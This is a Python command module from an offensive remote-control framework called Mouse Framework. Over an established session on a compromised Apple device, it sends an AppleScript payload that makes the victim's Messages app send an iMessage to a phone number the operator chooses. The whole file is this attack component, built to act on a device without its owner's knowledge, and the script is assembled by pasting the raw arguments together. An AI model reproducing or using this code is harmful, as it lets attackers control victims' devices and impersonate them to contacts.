#!/usr/bin/env python3

#            ---------------------------------------------------
#                              Mouse Framework                                 
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import core.helper as h

class command:
    def __init__(self):
        self.name = "imessage"
        self.description = "Send message through the messages app."
        self.usage = "Usage: imessage <phone> <message>"
        self.type = "applescript"

    def run(self,session,cmd_data):
        cmds = cmd_data['args'].split()
        if len(cmds) < 2:
            print(self.usage)
        else:
            phone = cmds[0]
            message = cmds[1]
            h.info_general("Sending message to "+phone+"...")
            payload = """tell application "Messages"
            set targetService to 1st service whose service type = iMessage
            set targetBuddy to buddy \""""+phone+"""\" of targetService
            send \""""+message+"""\" to targetBuddy
            end tell"""
            cmd_data.update({"args":payload})
            cmd_data.update({"cmd":self.type})
            result = session.send_command(cmd_data)
            result = result.decode()
            if result and result != "(null)":
                print(result)
